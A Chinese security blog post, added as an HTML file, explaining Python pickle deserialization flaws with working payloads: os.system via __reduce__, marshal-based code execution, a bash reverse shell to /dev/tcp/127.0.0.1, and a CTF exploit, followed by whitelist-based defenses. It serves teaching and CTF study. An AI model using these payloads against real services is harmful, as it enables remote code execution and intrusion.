@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>
+    python pickle反序列漏洞 | 道萝岗特森&#39;s Blog
+  </title>
+  <meta name="description" content="hello world">
+  
+  <meta name="keywords" content="
+  技术总结,python
+  ">
+  
+  <meta name="author" content="daolgts">
+
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="theme-color" content="#1e2327">
+  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">
+
+  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+  
+<script>
+  var _hmt = _hmt || [];
+  (function(){var hm = document.createElement("script");
+    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
+    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
+</script>
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
+</head>
+
+<body id="replica-app">
+
+<nav class="navbar-wrapper">
+  <div class="navbar">
+    <div class="container clearfix">
+      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>
+
+      <div class="navbar-search float-left desktop-only">
+        <div class="navbar-search-form">
+          <label for="gsc-i-id1">This website</label>
+          <div id="google-search">
+            <gcse:search></gcse:search>
+          </div>
+        </div>
+      </div>
+
+      <ul class="navbar-nav float-left">
+        
+        <li><a href="/archives">Archives</a></li>
+        
+        <!--  -->
+        
+        <li><a href="/tags">Tags</a></li>
+        
+        
+          <li><a href="/links">Links</a></li>
+        
+        
+          <li><a href="/about">About</a></li>
+        
+        
+      </ul>
+
+      <ul class="navbar-nav user-nav float-right desktop-only">
+        <li class="user-nav-notification">
+          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
+        </li>
+        <li>
+          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
+        </li>
+        <li class="user-nav-logo">
+          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<div class="main-container">
+  <header class="header-wrapper desktop-only">
+  <div class="container header-site-detail">
+    <ul class="header-toolbar">
+      <li class="clearfix">
+        <a href="/archives" class="header-toolbar-left"><i
+                  class="fa fa-file-text"></i> Posts </a>
+        <a href="/archives"
+           class="header-toolbar-right"> 40 </a>
+      </li>
+      <li>
+        <a href="/tags" class="header-toolbar-left"><i
+                  class="fa fa-tags"></i> Tags </a>
+        <a href="/tags"
+           class="header-toolbar-right"> 20 </a>
+      </li>
+      <li>
+        <a href="/categories" class="header-toolbar-left"><i
+                  class="fa fa-folder-open"></i> Categories </a>
+        <a href="/categories"
+           class="header-toolbar-right"> 0 </a>
+      </li>
+    </ul>
+    <h2 class="header-title">
+      <i class="fa fa-book text-muted"></i>
+      <a href="/">道萝岗特森&#39;s Blog</a>
+      
+      
+    </h2>
+  </div>
+
+  <div class="container">
+    <div class="header-tab-wrapper clearfix">
+      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
+      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
+      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
+      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
+      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
+    </div>
+  </div>
+</header>
+
+
+<div class="post-container container">
+  <h3>
+    <i class="fa fa-user-o"></i>
+    daolgts
+
+    <span class="post-date float-right" title="{{moment(1569564000000).format('MMM DD, YYYY, h:mm:ss A')}}">
+      <i class="fa fa-pencil-square-o"></i>
+      {{moment(1569564000000).fromNow()}}
+    </span>
+  </h3>
+
+  <article class="post-content">
+    <h1>python pickle反序列漏洞</h1>
+    <h1 id="0x00-Python对象序列化库-pickle"><a href="#0x00-Python对象序列化库-pickle" class="headerlink" title="0x00 Python对象序列化库 pickle"></a>0x00 Python对象序列化库 pickle</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>与其他语言相同，python也有序列化/反序列化的方式</p>
+<p>python序列化主要有<code>pickle</code>、<code>marshal</code>、<code>json</code>三种</p>
+<p>pickle库： <a href="https://docs.python.org/zh-cn/3/library/pickle.html" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/library/pickle.html</a></p>
+<ul>
+<li><code>marshal</code> 模块更加原始，一般 <code>pickle</code> 是序列化Python对象时的首选。</li>
+<li><code>JSON</code> 序列化输出文本格式，可直观阅读。<code>pickle</code> 序列化输出二进制格式，不能直观阅读。</li>
+<li><code>JSON</code> 只能序列化Python内置类型，不能表示自定义的类。<code>pickle</code>可以表示大量的 Python 数据类型，包括用户自定义的类。</li>
+<li><code>JSON</code> 兼容性更好，而 <code>pickle</code> 是 Python 专用的。</li>
+</ul>
+<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>输出为文件对象：<br><code>pickle.dump(obj, file, protocol=None, *, fix_imports=True)</code></p>
+<p>输出为 bytes 对象：<br><code>pickle.dumps(obj, protocol=None, *, fix_imports=True)</code></p>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>从文件对象中读取 pickle 对象：<br><code>pickle.load(file, *, fix_imports=True, encoding=&quot;ASCII&quot;, errors=&quot;strict&quot;)</code></p>
+<p>从 bytes 对象中读取 pickle 对象：<br><code>pickle.loads(bytes_object, *, fix_imports=True, encoding=&quot;ASCII&quot;, errors=&quot;strict&quot;)</code></p>
+<h2 id="protocol-数据流格式"><a href="#protocol-数据流格式" class="headerlink" title="protocol 数据流格式"></a>protocol 数据流格式</h2><p>用于 pickling 的协议共有5种,使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新</p>
+<p>只有 <code>protocol = 0</code> 的输出是可读的，其他版本均含有不可见字符</p>
+<h2 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h2><p>分析<code>pickle</code>序列化数据的工具<br><img src="https://s2.ax1x.com/2019/08/29/mLQ2rt.png" alt="mLQ2rt.png"></p>
+<h1 id="0x01-Python反序列化漏洞"><a href="#0x01-Python反序列化漏洞" class="headerlink" title="0x01 Python反序列化漏洞"></a>0x01 Python反序列化漏洞</h1><h2 id="reduce-方法"><a href="#reduce-方法" class="headerlink" title="__reduce__ 方法"></a><code>__reduce__</code> 方法</h2><p><code>https://docs.python.org/zh-cn/3.7/library/pickle.html#object.__reduce__</code></p>
+<p><code>__reduce__</code> 方法在序列化的时候会完全改变被序列化的对象</p>
+<ul>
+<li>如果返回值是一个字符串，那么将会去查找字符串值对应名字的对象，将其序列化之后返回</li>
+<li>如果返回值是元组（2到5个参数），第一个参数是可调用（callable）的对象，第二个是该对象所需的参数元组，剩下三个可选</li>
+</ul>
+<p>这里是用第二种返回值来构造执行命令的payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">'id'</span>,))</span><br><span class="line"></span><br><span class="line">p = pickle.dumps(A())</span><br><span class="line">print([p])</span><br><span class="line">print(pickle.loads(p))</span><br></pre></td></tr></table></figure>
+
+<p>这里使用<code>python2</code>的话需要类继承自<code>object</code>,而<code>python3</code>则不需要</p>
+<p>不继承<code>object</code>：<br><img src="https://s2.ax1x.com/2019/08/29/mLGzvQ.png" alt="mLGzvQ.png"></p>
+<p>继承<code>object</code>：<br><img src="https://s2.ax1x.com/2019/08/29/mLGxgg.png" alt="mLGxgg.png"></p>
+<h2 id="有用的函数"><a href="#有用的函数" class="headerlink" title="有用的函数"></a>有用的函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">eval, execfile, compile, open, file, map, input,</span><br><span class="line">os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,</span><br><span class="line">os.listdir, os.access,</span><br><span class="line">os.execl, os.execle, os.execlp, os.execlpe, os.execv,</span><br><span class="line">os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,</span><br><span class="line">os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,</span><br><span class="line">pickle.load, pickle.loads,cPickle.load,cPickle.loads,</span><br><span class="line">subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,</span><br><span class="line">commands.getstatusoutput,commands.getoutput,commands.getstatus,</span><br><span class="line">glob.glob,</span><br><span class="line">linecache.getline,</span><br><span class="line">shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,</span><br><span class="line">dircache.listdir,dircache.opendir,</span><br><span class="line">io.open,</span><br><span class="line">popen2.popen2,popen2.popen3,popen2.popen4,</span><br><span class="line">timeit.timeit,timeit.repeat,</span><br><span class="line">sys.call_tracing,</span><br><span class="line">code.interact,code.compile_command,codeop.compile_command,</span><br><span class="line">pty.spawn,</span><br><span class="line">posixfile.open,posixfile.fileopen,</span><br><span class="line">platform.popen</span><br></pre></td></tr></table></figure>
+
+<h2 id="input-函数"><a href="#input-函数" class="headerlink" title="input 函数"></a><code>input</code> 函数</h2><p>在<code>python2</code>中，<code>input</code>函数能用执行代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">daolgts@DESKTOP-4DDBUKG:~$ python</span><br><span class="line">Python 2.7.15+ (default, Nov 27 2018, 23:36:35)</span><br><span class="line">[GCC 7.3.0] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; input(&quot;&quot;)</span><br><span class="line">__import__(&apos;os&apos;).system(&apos;id&apos;)</span><br><span class="line">uid=1000(daolgts) gid=1000(daolgts) groups=1000(daolgts),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(lxd),114(netdev)</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 反弹shell</span><br><span class="line">a=&apos;&apos;&apos;c__builtin__\nsetattr\n(c__builtin__\n__import__\n(S&apos;sys&apos;\ntRS&apos;stdin&apos;\ncStringIO\nStringIO\n(S&apos;__import__(&apos;os&apos;).system(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&apos;)&apos;\ntRtRc__builtin__\ninput\n(S&apos;python&gt; &apos;\ntR.&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line"># 修改*****为自定义命令</span><br><span class="line">a=&apos;&apos;&apos;c__builtin__\nsetattr\n(c__builtin__\n__import__\n(S&apos;sys&apos;\ntRS&apos;stdin&apos;\ncStringIO\nStringIO\n(S&apos;__import__(&apos;os&apos;).system(&apos;*****&apos;)&apos;\ntRtRc__builtin__\ninput\n(S&apos;python&gt; &apos;\ntR.&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">pickle.loads(a)</span><br></pre></td></tr></table></figure>
+
+<h2 id="任意函数构造"><a href="#任意函数构造" class="headerlink" title="任意函数构造"></a>任意函数构造</h2><p><a href="https://checkoway.net/musings/pickle/" target="_blank" rel="noopener">https://checkoway.net/musings/pickle/</a></p>
+<p><code>types.FunctionType</code> 配上 <code>marshal.loads</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import marshal</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    import os</span><br><span class="line">    os.system(&apos;whoami&apos;)</span><br><span class="line"></span><br><span class="line">payload1=&quot;&quot;&quot;ctypes</span><br><span class="line">FunctionType</span><br><span class="line">(cmarshal</span><br><span class="line">loads</span><br><span class="line">(cbase64</span><br><span class="line">b64decode</span><br><span class="line">(S&apos;%s&apos;</span><br><span class="line">tRtRc__builtin__</span><br><span class="line">globals</span><br><span class="line">(tRS&apos;&apos;</span><br><span class="line">tR(tR.&quot;&quot;&quot;%base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line"></span><br><span class="line">print [payload1]</span><br><span class="line">pickle.loads(payload1)</span><br><span class="line"></span><br><span class="line">payload2=&quot;&quot;&quot;ctypes</span><br><span class="line">FunctionType</span><br><span class="line">(cmarshal</span><br><span class="line">loads</span><br><span class="line">(S&apos;%s&apos;</span><br><span class="line">tRc__builtin__</span><br><span class="line">globals</span><br><span class="line">(tRS&apos;&apos;</span><br><span class="line">tR(tR.&quot;&quot;&quot;%marshal.dumps(foo.func_code).encode(&apos;string-escape&apos;)</span><br><span class="line"></span><br><span class="line">print [payload2]</span><br><span class="line">pickle.loads(payload2)</span><br></pre></td></tr></table></figure>
+
+<p><code>new.function</code> 配上 <code>marshal.loads</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import marshal</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    import os</span><br><span class="line">    # os.system(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&apos;)</span><br><span class="line">    os.system(&apos;whoami&apos;)</span><br><span class="line"></span><br><span class="line">payload1=&quot;&quot;&quot;cnew</span><br><span class="line">function</span><br><span class="line">(cmarshal</span><br><span class="line">loads</span><br><span class="line">(cbase64</span><br><span class="line">b64decode</span><br><span class="line">(S&apos;%s&apos;</span><br><span class="line">tRtRc__builtin__</span><br><span class="line">globals</span><br><span class="line">(tRS&apos;&apos;</span><br><span class="line">tR(tR.&quot;&quot;&quot;%base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line"></span><br><span class="line">print [payload1]</span><br><span class="line">pickle.loads(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=&quot;&quot;&quot;cnew</span><br><span class="line">function</span><br><span class="line">(cmarshal</span><br><span class="line">loads</span><br><span class="line">(S&apos;%s&apos;</span><br><span class="line">tRc__builtin__</span><br><span class="line">globals</span><br><span class="line">(tRS&apos;&apos;</span><br><span class="line">tR(tR.&quot;&quot;&quot;%marshal.dumps(foo.func_code).encode(&apos;string-escape&apos;)</span><br><span class="line"></span><br><span class="line">print [payload2]</span><br><span class="line">pickle.loads(payload2)</span><br></pre></td></tr></table></figure>
+
+<h2 id="类函数"><a href="#类函数" class="headerlink" title="类函数"></a>类函数</h2><p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=pickle.dumps(new.classobj(&apos;system&apos;, (), &#123;&apos;__getinitargs__&apos;:lambda self,arg=(&apos;id&apos;,):arg, &apos;__module__&apos;: &apos;os&apos;&#125;)())</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import new</span><br><span class="line">&gt;&gt;&gt; payload=pickle.dumps(new.classobj(&apos;system&apos;, (), &#123;&apos;__getinitargs__&apos;:lambda self,arg=(&apos;id&apos;,):arg, &apos;__module__&apos;: &apos;os&apos;&#125;)())</span><br><span class="line">&gt;&gt;&gt; payload</span><br><span class="line">&quot;(S&apos;id&apos;\np1\nios\nsystem\np2\n(dp3\nb.&quot;</span><br><span class="line">&gt;&gt;&gt; pickle.loads(payload)</span><br><span class="line">uid=1000(daolgts) gid=1000(daolgts) groups=1000(daolgts),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(lxd),114(netdev)</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<h2 id="手动构造-pickle-code"><a href="#手动构造-pickle-code" class="headerlink" title="手动构造 pickle code"></a>手动构造 pickle code</h2><p>前面说到 <code>protocol = 0</code> 时 pickle code 是可读的，也可以手动构造pickle code</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html#pickle-code" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html#pickle-code</a></p>
+<p><code>c</code>：引入模块和对象，模块名和对象名以换行符分割。（<code>find_class</code>校验就在这一步，也就是说，只要c这个OPCODE的参数没有被<code>find_class</code>限制，其他地方获取的对象就不会被沙盒影响了，这也是我为什么要用getattr来获取对象）</p>
+<p><code>(</code>：压入一个标志到栈中，表示元组的开始位置</p>
+<p><code>t</code>：从栈顶开始，找到最上面的一个<code>(</code>，并将<code>(</code>到<code>t</code>中间的内容全部弹出，组成一个元组，再把这个元组压入栈中</p>
+<p><code>R</code>：从栈顶弹出一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上</p>
+<p><code>p</code>：将栈顶的元素存储到memo中，p后面跟一个数字，就是表示这个元素在memo中的索引</p>
+<p><code>V</code>、<code>S</code>：向栈顶压入一个（unicode）字符串</p>
+<p><code>.</code>：表示整个程序结束</p>
+<h2 id="anapickle"><a href="#anapickle" class="headerlink" title="anapickle"></a>anapickle</h2><p>Toolset for writing shellcode in Python’s Pickle language and for manipulating pickles to inject shellcode.</p>
+<p><a href="https://github.com/sensepost/anapickle" target="_blank" rel="noopener">https://github.com/sensepost/anapickle</a></p>
+<h1 id="0x02-CTF-题目"><a href="#0x02-CTF-题目" class="headerlink" title="0x02 CTF 题目"></a>0x02 CTF 题目</h1><h2 id="code-breaking-picklecode"><a href="#code-breaking-picklecode" class="headerlink" title="code-breaking picklecode"></a>code-breaking picklecode</h2><p><a href="https://github.com/phith0n/code-breaking/tree/master/2018/picklecode" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/tree/master/2018/picklecode</a></p>
+<p>wp: <a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html#" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html#</a></p>
+<h2 id="SUCTF2019-guess-game"><a href="#SUCTF2019-guess-game" class="headerlink" title="SUCTF2019 guess_game"></a>SUCTF2019 guess_game</h2><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game</a></p>
+<p>wp: <a href="https://github.com/rmb122/suctf2019_guess_game/tree/master/writeup" target="_blank" rel="noopener">https://github.com/rmb122/suctf2019_guess_game/tree/master/writeup</a></p>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exp = b&apos;&apos;&apos;cguess_game</span><br><span class="line">game</span><br><span class="line">&#125;S&quot;win_count&quot;</span><br><span class="line">I10</span><br><span class="line">sS&quot;round_count&quot;</span><br><span class="line">I9</span><br><span class="line">sbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x01sb.&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03-防御"><a href="#0x03-防御" class="headerlink" title="0x03 防御"></a>0x03 防御</h1><h2 id="Restricting-Globals"><a href="#Restricting-Globals" class="headerlink" title="Restricting Globals"></a>Restricting Globals</h2><p>使用官方推荐的<code>find_class</code>方法,使用白名单限制反序列化引入的对象</p>
+<p><a href="https://docs.python.org/3.7/library/pickle.html#pickle-restrict" target="_blank" rel="noopener">https://docs.python.org/3.7/library/pickle.html#pickle-restrict</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import builtins</span><br><span class="line">import io</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">safe_builtins = &#123;</span><br><span class="line">    &apos;range&apos;,</span><br><span class="line">    &apos;complex&apos;,</span><br><span class="line">    &apos;set&apos;,</span><br><span class="line">    &apos;frozenset&apos;,</span><br><span class="line">    &apos;slice&apos;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class RestrictedUnpickler(pickle.Unpickler):</span><br><span class="line"></span><br><span class="line">    def find_class(self, module, name):</span><br><span class="line">        # Only allow safe classes from builtins.</span><br><span class="line">        if module == &quot;builtins&quot; and name in safe_builtins:</span><br><span class="line">            return getattr(builtins, name)</span><br><span class="line">        # Forbid everything else.</span><br><span class="line">        raise pickle.UnpicklingError(&quot;global &apos;%s.%s&apos; is forbidden&quot; %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line">def restricted_loads(s):</span><br><span class="line">    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br><span class="line">    return RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure>
+
+<h2 id="pickleFilter"><a href="#pickleFilter" class="headerlink" title="pickleFilter"></a>pickleFilter</h2><p><a href="https://github.com/Qianlitp/pickleFilter/" target="_blank" rel="noopener">https://github.com/Qianlitp/pickleFilter/</a></p>
+<p>利用对 load_reduce 函数添加装饰器，拦截了不信任的可调用对象，一定程度上减少 pickle模块 反序列缺陷所造成的危害。</p>
+<h1 id="0x04-Referer"><a href="#0x04-Referer" class="headerlink" title="0x04 Referer"></a>0x04 Referer</h1><ul>
+<li><a href="https://docs.python.org/zh-cn/3/library/pickle.html" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/library/pickle.html</a></li>
+<li><a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/178/</a></li>
+<li><a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></li>
+<li><a href="https://xz.aliyun.com/t/2289" target="_blank" rel="noopener">https://xz.aliyun.com/t/2289</a></li>
+</ul>
+
+  </article>
+</div>
+
+
+    
+
+
+
+
+</div>
+
+<div class="footer-wrapper container">
+  <footer class="footer clearfix">
+    <div class="clearfix">
+    <a href="https://daolgts.github.io" class="footer-logo">
+      <i class="fa fa-github"></i>
+    </a>
+    <ul class="footer-social-link">
+      <li>© 2019 daolgts</li>
+      <li><a href="https://daolgts.github.io">Home</a></li>
+      
+      <li><a href="https://github.com/daolgts">Github</a></li>
+      
+    </ul>
+    <div class="footer-theme-info">
+      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
+      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
+    </div>
+    </div>
+    
+  </footer>
+</div>
+
+
+<script>
+  (function() {
+    var cx = '005157513716557594323:jvii0oiejlb';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+      '//cse.google.com/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+</body>
+</html>
